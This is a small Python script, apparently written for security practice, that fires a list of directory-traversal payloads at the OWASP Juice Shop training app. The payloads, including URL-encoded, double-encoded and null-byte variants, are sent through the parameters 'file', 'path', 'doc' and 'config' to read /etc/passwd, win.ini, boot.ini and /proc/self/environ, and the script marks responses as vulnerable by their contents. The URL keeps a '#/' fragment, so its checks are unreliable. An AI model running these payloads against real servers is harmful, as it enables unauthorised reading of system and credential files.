import requests

url = "https://juice-shop.herokuapp.com/#/"

# Directory traversal payloads
payloads = [
            "../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../windows/win.ini",
        "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "/windows/win.ini",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%00../etc/passwd",
        "../../../../../../boot.ini",
        "..%2f..%2f..%2fwindows%2fwin.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "/proc/self/environ"
]

# Parameters to test
parameters = ["file", "path", "doc", "config"]

for param in parameters:
    for payload in payloads:
        response = requests.get(url, params={param: payload})
        if "root:" in response.text or "[extensions]" in response.text:
            print(f"[VULNERABLE] {param}: {payload}")
        else:
            print(f"[NOT VULNERABLE] {param}: {payload}")
